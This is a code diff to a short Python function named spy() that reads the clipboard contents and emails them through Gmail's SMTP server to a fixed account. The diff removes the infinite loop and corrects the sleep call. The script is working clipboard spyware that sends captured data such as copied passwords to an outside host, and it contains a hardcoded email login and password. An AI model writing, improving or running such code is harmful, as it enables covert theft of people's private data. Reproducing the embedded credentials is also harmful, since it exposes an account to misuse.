@@ -1,22 +1,23 @@
 import pyperclip
 import smtplib
+import time
 
 def spy():
 
-	while True:
+	#while True:
 
-		server = smtplib.SMTP('smtp.gmail.com', 587)
-		server.ehlo()
-		server.starttls()
+	server = smtplib.SMTP('smtp.gmail.com', 587)
+	server.ehlo()
+	server.starttls()
 
-		server.login("jacksonsoftwaresolutions", "Bt(c@245")
+	server.login("jacksonsoftwaresolutions", "Bt(c@245")
 		
-		data = pyperclip.paste().encode("utf-8") #.decode('utf-8')
+	data = pyperclip.paste().encode("utf-8") #.decode('utf-8')
 
-		server.sendmail("jacksonsoftwaresolutions@gmail.com",
-		"jacksonsoftwaresolutions@gmail.com", data)
+	server.sendmail("jacksonsoftwaresolutions@gmail.com",
+	"jacksonsoftwaresolutions@gmail.com", data)
 
-		sleep(3600)
+	time.sleep(3600)
 
 	server.close()
 
